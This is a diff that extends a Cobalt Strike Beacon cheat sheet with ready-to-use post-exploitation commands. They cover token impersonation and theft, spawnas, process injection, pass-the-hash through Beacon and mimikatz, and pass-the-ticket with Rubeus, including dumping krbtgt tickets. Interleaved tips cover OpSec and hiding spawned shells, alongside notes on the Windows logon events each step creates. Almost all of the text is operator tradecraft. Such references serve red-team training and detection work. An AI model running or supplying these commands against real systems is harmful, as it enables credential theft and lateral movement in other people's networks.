@@ -49,11 +49,70 @@ screenwatch    # Take periodic screenshots of desktop
 keylogger [pid] [x86|x64]
 ## View > Keystrokes to see the keys pressed
 
+# Powershell
 # Import Powershell module
 powershell-import C:\path\to\PowerView.ps1
+powershell just write powershell cmd here
 
 # User impersonation
-make_token [DOMAIN\user] [password] #Create token tom impersonate user
+## Token generation with creds
+make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
+ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
+rev2self # Stop using token generated with make_token
+## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.
+
+
+## Steal token from pid
+## Like make_token but stealing the token from a process
+steal_token [pid] # Also, this is useful for network actions, not local actions
+## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated &#x3C;current_username> - it's impersonating our own cloned token.
+ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
+rev2self # Stop using token from steal_token
+
+## Launch process with nwe credentials
+spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
+## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).
+
+## Inject into process
+inject [pid] [x64|x86] [listener]
+## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).
+
+## Pass the hash
+## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
+pth [pid] [arch] [DOMAIN\user] [NTLM hash]
+pth [DOMAIN\user] [NTLM hash]
+
+## Pass the hash through mimikatz
+mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
+## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
+steal_token &#x3C;pid> #Steal token from process created by mimikatz
+
+## Pass the ticket
+## Request a ticket
+execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
+## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
+make_token &#x3C;domain>\&#x3C;username> DummyPass
+## Write the ticket in the attacker machine from a poweshell session &#x26; load it
+[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
+kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
+
+## Pass the ticket from SYSTEM
+## Generate a new process with the ticket
+execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
+## Steal the token from that process
+steal_token &#x3C;pid>
+
+## Extract ticket + Pass the ticket
+### List tickets
+execute-assembly C:\path\Rubeus.exe triage
+### Dump insteresting ticket by luid
+execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
+### Create new logon session, note luid and processid
+execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+### Insert ticket in generate logon session
+execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
+### Finally, steal the token from that new process
+steal_token &#x3C;pid>
 
 # Lateral Movement
 ## If a token was created it will be used
